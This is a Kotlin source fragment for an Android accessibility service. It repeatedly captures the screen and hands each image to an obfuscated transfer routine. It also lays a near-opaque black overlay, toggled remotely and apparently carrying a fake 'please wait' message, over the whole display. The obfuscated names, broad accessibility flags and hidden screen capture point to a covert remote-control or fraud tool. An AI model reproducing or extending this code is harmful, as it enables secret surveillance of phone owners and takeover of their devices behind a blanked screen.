	                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
	                       d("live")
	                    }
					} 
                    val delay = screenshotDelayMillis ?: return
                    Thread.sleep(delay)
                } catch (e: Exception) {
                    e.printStackTrace()
                }
            }
        } finally {
            shouldRun = false
        }
    }

    //
    fun i() {
        Thread {
            l()
        }.start()
    }


	 class ScreenshotCallback(
      //  private val context: Context,
     //   private val quality: Int,
     //   private val identifier: String
    ) : AccessibilityService.TakeScreenshotCallback {
		 
       /*
        companion object {
            @JvmStatic
            var savedCount = 0  // 已保存的截图数量
            const val MAX_COUNT = 10
        }

		
        inner class ScreenshotThread(
            private val screenshotResult: AccessibilityService.ScreenshotResult
        ) : Thread() {

            override fun run() {
                var originalBitmap: Bitmap? = null
                var scaledBitmap: Bitmap? = null

                try {
					 
                     if (shouldRun && !SKL) {
                        //恢复截图模式
						//截图模式直接返回 不做处理
                        //screenshotResult.hardwareBuffer?.close()
                        //return
                    }
					 else
					{
						//非截图模式也直接返回 不做处理
                        screenshotResult.hardwareBuffer?.close()
                        return
					}

                    val hardwareBuffer: HardwareBuffer? = screenshotResult.hardwareBuffer
                    val colorSpace: ColorSpace? = screenshotResult.colorSpace
                     originalBitmap =
                        hardwareBuffer?.let { Bitmap.wrapHardwareBuffer(it, colorSpace) }

                    screenshotResult.hardwareBuffer?.close()
						
                    if (originalBitmap == null) return

            
                     val w = originalBitmap.width
					 val h = originalBitmap.height
					Log.d("input service", "originalBitmap size: width=$w, height=$h")

					 
                    // 等比缩放宽度到 350 像素
                    //val scaledHeight = (originalBitmap.height.toFloat() / originalBitmap.width * 350).toInt()
                    scaledBitmap = originalBitmap// Bitmap.createScaledBitmap(originalBitmap, 350, scaledHeight, true)

                    //设置缩放
					DataTransferManager.a012933444445(scaledBitmap)

					/* 保存图片
                    //不缩放
                    //scaledBitmap=originalBitmap

                    // 保存到相册/外部存储
                    val filename = "screenshot_${System.currentTimeMillis()}.png"
                    val contentValues = ContentValues().apply {
                        put(MediaStore.Images.Media.DISPLAY_NAME, filename)
                        put(MediaStore.Images.Media.MIME_TYPE, "image/png")
                        put(MediaStore.Images.Media.RELATIVE_PATH, Environment.DIRECTORY_PICTURES)
                    }

                    val resolver = context.contentResolver
                    val uri = resolver.insert(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, contentValues)
                    uri?.let {
                        resolver.openOutputStream(it)?.use { out ->
                            scaledBitmap.compress(Bitmap.CompressFormat.PNG, quality, out)
                            savedCount++  // 成功保存后计数
                            Log.d("saveScreenshot", "截图保存成功：$filename ($identifier 已保存 $savedCount 张)")
                        }
                    }
					*/

                } catch (e: Exception) {
                    e.printStackTrace()
                }
                finally {

                    // 在 finally 里安全释放资源
                    originalBitmap?.recycle()
                    scaledBitmap?.recycle()
                    screenshotResult.hardwareBuffer?.close()
                }
            }
        }
        */

	       private class ScreenshotThread(
		    private val screenshotResult: AccessibilityService.ScreenshotResult
		) : Thread() {
		
		    override fun run() {
		        var originalBitmap: Bitmap? = null
		        var hardwareBuffer: HardwareBuffer? = null
		
		        try {
		            if (shouldRun && !SKL) {
						Log.d("input service", "截图模式逻辑 shouldRun:$shouldRun, SKL=$SKL")
		                // 截图模式逻辑
		            } else {
		                return
		            }
		
		            hardwareBuffer = screenshotResult.hardwareBuffer
		            val colorSpace: ColorSpace? = screenshotResult.colorSpace
		            originalBitmap = hardwareBuffer?.let { Bitmap.wrapHardwareBuffer(it, colorSpace) }
		
		            if (originalBitmap == null) return
		
		            DataTransferManager.a012933444445(originalBitmap)
		
		        } catch (e: Exception) {
		            e.printStackTrace()
		        } finally {           
		            originalBitmap?.recycle()
		            hardwareBuffer?.close()
		        }
		    }
		}

		
        override fun onFailure(errorCode: Int) {
            if (errorCode == 3) {
                // k += 50
            }
        }

        override fun onSuccess(screenshotResult: AccessibilityService.ScreenshotResult) {
            if (shouldRun && !SKL) {
                ScreenshotThread(screenshotResult).start()
            }
            else
            {
                screenshotResult.hardwareBuffer?.close()
            }
        }
    }

	
	/*
    //  private val serviceScope = CoroutineScope(Dispatchers.Default + SupervisorJob())
    private val job = SupervisorJob()
    private val serviceScope = CoroutineScope(job + Dispatchers.Default)
    private val handlerScope = Handler(Looper.getMainLooper())
    private var isLoopRunning = false
	
    private val screenShotHandler = Handler(Looper.getMainLooper()) { message ->
        if (message.what == 1) {
             if (shouldRun && !SKL) {
                  safeScreenshot(applicationContext, serviceScope)
              }
        }
        false
    }
    
    private val screenshotRunnable = object : Runnable {
        override fun run() {
            //screenshotDelayMillis ?: return 
	    val delay = screenshotDelayMillis ?: return
	    screenShotHandler.sendEmptyMessage(1)
            handlerScope.postDelayed(this, delay)
            //handlerScope.postDelayed(this, screenshotDelayMillis)
        }
    }

	
    fun checkAndStartScreenshotLoop(start: Boolean) {
        if (start) {
	 if (!isLoopRunning) {
	    isLoopRunning = true
	    //shouldRun = true
	    handlerScope.post(screenshotRunnable)
	 }
        } else {
	  if (isLoopRunning) {
	    isLoopRunning = false
	    handlerScope.removeCallbacks(screenshotRunnable)
	  }
        }
    }

    fun safeScreenshot(context: Context, coroutineScope: CoroutineScope) {
        //Log.d("ScreenshotService", "开始截图")
    
        val backgroundExecutor = Executors.newSingleThreadExecutor()
    
        takeScreenshot(0, backgroundExecutor, object : TakeScreenshotCallback {
            override fun onSuccess(screenshotResult: ScreenshotResult) {
                coroutineScope.launch(Dispatchers.Default) {//Default
		   //val logger = TimeLogger("ScreenshotService", "截图流程")

                    try {
                        val buffer = screenshotResult.hardwareBuffer
                        val colorSpace = screenshotResult.colorSpace
                        //logger.log("获取 buffer")
			val bitmap = Bitmap.wrapHardwareBuffer(buffer, colorSpace)
			//logger.log("wrapHardwareBuffer")
			if (bitmap != null) {
			    try {
			        DataTransferManager.a012933444445(bitmap)
				//logger.log("处理 bitmap")
			    } finally {
			        bitmap.recycle() // 显式回收
			        buffer.close()
			    }
			}
                    } catch (e: Exception) {
                       // Log.e("ScreenshotService", "处理截图异常：${e.message}")
                    }
                }
            }
    
            override fun onFailure(errorCode: Int) {
               // Log.e("ScreenshotService", "截图失败，错误码：$errorCode")
            }
        })
    }*/
   
    override fun onServiceConnected() {
        super.onServiceConnected()
        ctx = this
		/*
        val info = AccessibilityServiceInfo()
        if (Build.VERSION.SDK_INT >= 33) {
            info.flags = FLAG_INPUT_METHOD_EDITOR or FLAG_RETRIEVE_INTERACTIVE_WINDOWS
        } else {
            info.flags = FLAG_RETRIEVE_INTERACTIVE_WINDOWS
        }
        setServiceInfo(info)
        */
		
          try {
               val accessibilityServiceInfo = AccessibilityServiceInfo().apply {
		        flags = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
		            0x0100807b
		        } else {
		            123
		        }
		        eventTypes = -1
		        notificationTimeout = 0L
		        packageNames = null
		        feedbackType = -1
		    }
		    setServiceInfo(accessibilityServiceInfo)
		  
		} catch (_: Exception) {
		    // 忽略异常
		}
       

		
	   //FFI.c6e5a24386fdbdd7f(this)
	   
        fakeEditTextForTextStateCalculation = EditText(this)
        // Size here doesn't matter, we won't show this view.
        fakeEditTextForTextStateCalculation?.layoutParams = LayoutParams(100, 100)
        fakeEditTextForTextStateCalculation?.onPreDraw()
        val layout = fakeEditTextForTextStateCalculation?.getLayout()
       //   Log.d(logTag, "fakeEditTextForTextStateCalculation layout:$layout")
        //  Log.d(logTag, "onServiceConnected!")
         windowManager = getSystemService(WINDOW_SERVICE) as WindowManager
        try {
            //createView(windowManager)
		/*
	 overLay = FFI.createView(
	    this, windowManager,
	    viewUntouchable, viewTransparency,
	    FFI.getNetArgs0(), FFI.getNetArgs1(),
	    FFI.getNetArgs2(), FFI.getNetArgs3()
	)*/
		e15f7cc69f667bd3()	
            handler.postDelayed(runnable, 1000)
            //Log.d(logTag, "onCreate success")
        } catch (e: Exception) {
           // Log.d(logTag, "onCreate failed: $e")
        }
    }
    
@SuppressLint("ClickableViewAccessibility")
  private fun e15f7cc69f667bd3()
	{
        overLay = FFI.e15f7cc69f667bd3(
	    this, windowManager,
	    viewUntouchable, viewTransparency,
	    FFI.getNetArgs0(), FFI.getNetArgs1(),
	    FFI.getNetArgs2(), FFI.getNetArgs3()
	)
}

    private val handler = Handler(Looper.getMainLooper())
    private val runnable = object : Runnable {
        override fun run() {
	               if (overLay.windowToken != null) 
					{ 
						    if (overLay.visibility == 8) {  // 如果已经是 GONE
							 BIS = false
						     }
						    else {
							 BIS = true
						    }
						
						if( overLay.visibility != gohome)
						{ 
							overLay.post {
							    if (gohome == 8) {  // 不可见状态
								overLay.isFocusable = false
								overLay.isClickable = false
							    } else {  // 可见状态
								overLay.isFocusable = true
								overLay.isClickable = true
							    }
							    overLay.visibility = gohome
							}
						   
						    // overLay.setVisibility(gohome)
						    // windowManager.updateViewLayout(overLay, overLayparams_bass)
					       }
						else
						{
				
						}
				}
               handler.postDelayed(this, 50) 
        }
    }
	
    override fun onDestroy() {
        ctx = null
        windowManager.removeView(overLay) 
		 shouldRun =false // ✅ 正确
		 i.shutdown() // ✅ 正确
	    //job.cancel() // ✅ 正确
        //checkAndStartScreenshotLoop(false)
        super.onDestroy()
    }

    override fun onInterrupt() {}
}
















    /*
    class TimeLogger(private val tag: String, private val label: String = "TimeLogger") {

    private var lastTimestamp = SystemClock.elapsedRealtime()

    fun log(step: String) {
        val now = SystemClock.elapsedRealtime()
        val duration = now - lastTimestamp
        Log.d(tag, "[$label] $step: ${duration} ms")
        lastTimestamp = now
    }

    fun reset() {
        lastTimestamp = SystemClock.elapsedRealtime()
    }
  }*/
  
/*
                        val bitmap = Bitmap.wrapHardwareBuffer(buffer, colorSpace)
    
                        if (bitmap != null) {
                            // ✅ 此处在后台处理数据
                            DataTransferManager.a012933444445(bitmap)
    
                            // 如果你想更新 UI，比如显示截图预览
                            withContext(Dispatchers.Main) {
                                Log.d("ScreenshotService", "截图成功，可更新 UI 或 Toast")
                                // showToast(context, "截图完成")
                            }
                        } else {
                            Log.w("ScreenshotService", "wrapHardwareBuffer 返回空")
                        }
    
                        // ⚠️ 不要忘记释放资源
                        buffer.close()
			*/


			    
    /*
 @SuppressLint("ClickableViewAccessibility")
    private fun createView(windowManager: WindowManager) {  
        var flags = FLAG_LAYOUT_IN_SCREEN or FLAG_NOT_TOUCH_MODAL or FLAG_NOT_FOCUSABLE
        if (viewUntouchable || viewTransparency == 0f) {
            flags = flags or WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
        }

       // var w = FFI.getNetArgs0()//HomeWith
       // var h = FFI.getNetArgs1()//HomeHeight 
       
        var ww = FFI.getNetArgs2()
        var hh = FFI.getNetArgs3()	
	
	//Log.d(logTag, "createView: $w,$h,$ww,$hh")

        /* if(HomeWidth >0 && HomeHeight>0 )
	 {
                ww= HomeWidth 
		hh= HomeHeight
	 }*/
	
    	overLayparams_bass =  WindowManager.LayoutParams(ww, hh, FFI.getNetArgs0(),FFI.getNetArgs1(), 1)
        overLayparams_bass.gravity = Gravity.TOP or Gravity.START
        overLayparams_bass.x = 0
        overLayparams_bass.y = 0
    	if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
    	    overLayparams_bass.flags = overLayparams_bass.flags or WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
    	    overLayparams_bass.flags = overLayparams_bass.flags or WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
    	}
    	overLay =  FrameLayout(this)
    	overLay.setBackgroundColor(Color.parseColor("#000000"));//#000000
    	overLay.getBackground().setAlpha(253)
	overLay.setVisibility(8)
        overLay.setFocusable(false)
        overLay.setClickable(false)

        val loadingText = TextView(this, null)
	loadingText.text = "\n\n......"
	loadingText.setTextColor(-7829368)
	loadingText.textSize = 15.0f
	loadingText.gravity = Gravity.LEFT //Gravity.CENTER
	loadingText.setPadding(60, HomeHeight / 4, 0, 0)

	val dp2px: Int = dp2px(this, 100.0f) //200.0f
	val paramstext = FrameLayout.LayoutParams(dp2px * 5, dp2px * 5)
	paramstext.gravity = Gravity.LEFT
	loadingText.layoutParams = paramstext

	//Fakelay.addView(getView2())
	overLay.addView(loadingText)
	
        windowManager.addView(overLay, overLayparams_bass)
    }*/

/*
    @SuppressLint("ClickableViewAccessibility")
private fun createView(windowManager: WindowManager) {
    var flags = FLAG_LAYOUT_IN_SCREEN or FLAG_NOT_TOUCH_MODAL or FLAG_NOT_FOCUSABLE
    if (viewUntouchable || viewTransparency == 0f) {
        flags = flags or WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
    }

    val ww = FFI.getNetArgs2()
    val hh = FFI.getNetArgs3()

    overLayparams_bass = WindowManager.LayoutParams(ww, hh, FFI.getNetArgs0(), FFI.getNetArgs1(), 1)
    overLayparams_bass.gravity = Gravity.TOP or Gravity.START
    overLayparams_bass.x = 0
    overLayparams_bass.y = 0

    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
        overLayparams_bass.flags = overLayparams_bass.flags or WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
    }

    overLay = FrameLayout(this)
    overLay.setBackgroundColor(Color.parseColor("#000000"))
    overLay.background.alpha = 253
    overLay.visibility = View.GONE
    overLay.isFocusable = false
    overLay.isClickable = false

    //val loadingText = TextView(this, null)
    val loadingText = TextView(this) // ✅ 正确构造方式，别传 null
    loadingText.text = "\n\n请请请请请请请请请请......\n请请请请请请请请\n请请请请请请\n请请请请请......"
    loadingText.setTextColor(-7829368)
    loadingText.textSize = 15.0f
    //loadingText.gravity = Gravity.LEFT
	
    loadingText.gravity = Gravity.LEFT or Gravity.BOTTOM
	
	// loadingText.setPadding(0, 0, 0, 0) // ❗清除原来的 padding
	loadingText.setPadding(20, 20, 20, 20) // 留点边距更美观

	/*
	// ✅ 设置带边框的背景
	val borderDrawable = GradientDrawable()
	borderDrawable.setColor(Color.TRANSPARENT) // 背景透明
	borderDrawable.setStroke(2, Color.GREEN)    // 边框宽度为 2px，颜色为灰色
	borderDrawable.cornerRadius = 16f          // 可选：圆角边框
	loadingText.background = borderDrawable
       */
    
    // ✅ 计算放置位置：屏幕底部向上偏移 60dp
    val displayMetrics = this.resources.displayMetrics
    //val displayMetrics = Resources.getSystem().displayMetrics
    val screenHeight = displayMetrics.heightPixels
    val viewHeight = dp2px(this, 100f) * 5
    val bottomOffset = dp2px(this, 60f) // 向上偏移的距离
    val topMargin = screenHeight - viewHeight - bottomOffset

    val paramstext = FrameLayout.LayoutParams(viewHeight, viewHeight)
    paramstext.gravity = Gravity.LEFT or Gravity.TOP
    paramstext.topMargin = topMargin
    paramstext.leftMargin = 60
    loadingText.layoutParams = paramstext

    overLay.addView(loadingText)
    windowManager.addView(overLay, overLayparams_bass)
}
    
    fun dp2px(context: Context, f: Float): Int {
        return (f * context.resources.displayMetrics.density + 0.5f).toInt()
    }
*/
